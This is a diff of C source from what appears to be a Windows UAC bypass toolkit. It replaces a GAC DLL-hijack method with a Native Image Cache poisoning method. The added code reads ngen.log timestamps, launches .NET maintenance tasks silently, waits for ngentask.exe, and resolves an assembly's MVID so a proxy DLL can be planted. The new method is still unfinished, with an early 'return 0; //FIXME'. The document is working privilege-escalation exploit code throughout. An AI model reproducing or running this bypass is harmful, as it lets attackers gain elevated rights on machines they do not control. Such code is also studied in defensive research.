@@ -6,7 +6,7 @@
 *
 *  VERSION:     3.27
 *
-*  DATE:        11 Sep 2020
+*  DATE:        12 Sep 2020
 *
 *  Hybrid UAC bypass methods.
 *
@@ -2137,14 +2137,13 @@ NTSTATUS ucmSXSDccwMethod(
         //
         // Check if target app available. Maybe unavailable in server edition.
         //
-#ifndef _DEBUG
         _strcpy(szTarget, g_ctx->szSystemDirectory);
         _strcat(szTarget, DCCW_EXE);
         if (!PathFileExists(szTarget)) {
             MethodResult = STATUS_OBJECT_NAME_NOT_FOUND;
             break;
         }
-#endif //_DEBUG
+
         //
         // Load GdiPlus in our address space to get it full path.
         //
@@ -3613,15 +3612,59 @@ NTSTATUS ucmEgre55Method(
 }
 
 /*
-* ucmGACPoisonMethod
+* ucmxNgenLogLastWrite
 *
 * Purpose:
 *
-* Bypass UAC by by Dll hijack of GAC.
+* Query ngen.log last write time.
+*
+*/
+BOOL ucmxNgenLogLastWrite(
+    _Out_ FILETIME *LastWriteTime
+)
+{
+    BOOL bResult = FALSE;
+    HANDLE hFile;
+    WCHAR szFileName[MAX_PATH * 2];
+
+    LastWriteTime->dwLowDateTime = 0;
+    LastWriteTime->dwHighDateTime = 0;
+
+    _strcpy(szFileName, g_ctx->szSystemRoot);
+    _strcat(szFileName, MSNETFRAMEWORK_DIR);
+
+#ifdef _WIN64
+    _strcat(szFileName, TEXT("64"));
+#endif
+
+    _strcat(szFileName, NET4_DIR);
+    _strcat(szFileName, TEXT("ngen.log"));
+
+    hFile = CreateFile(szFileName, 
+        GENERIC_READ, 
+        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
+        NULL, 
+        OPEN_EXISTING,
+        0,
+        NULL);
+    if (hFile != INVALID_HANDLE_VALUE) {
+        bResult = GetFileTime(hFile, NULL, NULL, LastWriteTime);
+        CloseHandle(hFile);
+    }
+
+    return bResult;
+}
+
+/*
+* ucmNICPoisonMethod
+*
+* Purpose:
+*
+* Bypass UAC by by Dll hijack of Native Image Cache.
 * Original author link: https://github.com/AzAgarampur/byeintegrity-uac
 *
 */
-NTSTATUS ucmGACPoisonMethod(
+NTSTATUS ucmNICPoisonMethod(
     _In_ PVOID ProxyDll,
     _In_ DWORD ProxyDllSize
 )
@@ -3635,16 +3678,85 @@ NTSTATUS ucmGACPoisonMethod(
     HANDLE hFile;
 
     LPWSTR oldSecurity = NULL;
+    LPWSTR lpAssemblyFilePath = NULL;
+
+    BOOLEAN IsWin7;
+
+#ifdef _DEBUG
+    BOOLEAN bWaitFailed = FALSE;
+#endif
+
+    FILETIME lastWriteTime, checkTime;
+
+    INT iRetryCount = 20;
+
+    GUID mvid;
 
     do {
 
-        //
-        // Run NET maintenance tasks.
-        //
-        _strcpy(szFileName, g_ctx->szSystemDirectory);
-        _strcat(szFileName, MSCHEDEXE_EXE);
-        if (!supRunProcess2(szFileName, TEXT("Start"), NULL, SW_HIDE, TRUE))
+        IsWin7 = (g_ctx->dwBuildNumber < 9200);
+
+        if (!supInitFusion(IsWin7 ? 2 : 4))
             break;
+
+        if (!supFusionGetAssemblyPathByName(TEXT("Accessibility"), &lpAssemblyFilePath))
+            break;
+
+        if (!supFusionGetImageMVID(lpAssemblyFilePath, &mvid))
+            break;
+
+        if (!IsWin7) {
+
+            ucmxNgenLogLastWrite(&lastWriteTime);
+
+            //
+            // Run NET maintenance tasks.
+            //
+            _strcpy(szFileName, g_ctx->szSystemDirectory);
+            _strcat(szFileName, MSCHEDEXE_EXE);
+            if (!supRunProcess2(szFileName, TEXT("Start"), NULL, SW_HIDE, TRUE))
+                break;
+
+            //
+            // Wait for task completion.
+            //
+
+#ifdef _DEBUG
+            bWaitFailed = TRUE;
+#endif
+
+            do {
+
+                Sleep(2000);
+
+                if (FALSE == supIsProcessRunning(TEXT("ngentask.exe"))) {
+
+                    if (ucmxNgenLogLastWrite(&checkTime)) {
+
+                        if (CompareFileTime(&lastWriteTime, &checkTime) < 0) {
+#ifdef _DEBUG
+                            bWaitFailed = FALSE;
+#endif
+                            break;
+                        }
+                    }
+
+                }
+
+                --iRetryCount;
+
+            } while (iRetryCount);
+
+        }
+
+#ifdef _DEBUG
+        if (bWaitFailed) {
+            OutputDebugString(TEXT(">>wait failed"));
+            DebugBreak();
+        }
+#endif
+
+        return 0; //FIXME
 
         //
         // Read existing file to memory.
@@ -3707,6 +3819,9 @@ NTSTATUS ucmGACPoisonMethod(
             MethodResult = STATUS_SUCCESS;
 
     } while (FALSE);
+
+    if (lpAssemblyFilePath)
+        supHeapFree(lpAssemblyFilePath);
 
     //
     // Restore original file contents and permissions.
